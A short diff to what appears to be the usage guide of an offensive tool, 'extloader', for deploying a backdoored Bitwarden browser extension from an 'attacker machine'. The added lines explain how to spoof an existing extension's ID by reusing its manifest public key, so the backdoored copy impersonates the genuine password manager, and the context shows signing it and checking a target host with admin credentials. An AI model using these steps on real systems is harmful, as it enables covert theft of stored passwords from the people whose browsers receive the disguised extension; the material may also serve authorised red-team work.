@@ -158,6 +158,8 @@ mv main_formatted.js main.js
 
 
 # On the attacker machine, Sign the modified extension
+# To spoof an existing extension ID, skip this command.
+# Indeed, setting the manifest key to the base64 public key of the extension you are mimicking keeps the CRX ID unchanged.
 $ extloader sign --extension ./bitwardenbackdoor/<version>_0
 # Retrieve IDs for deployment
 $ extloader check -t 192.168.1.23 -u admin -p Password
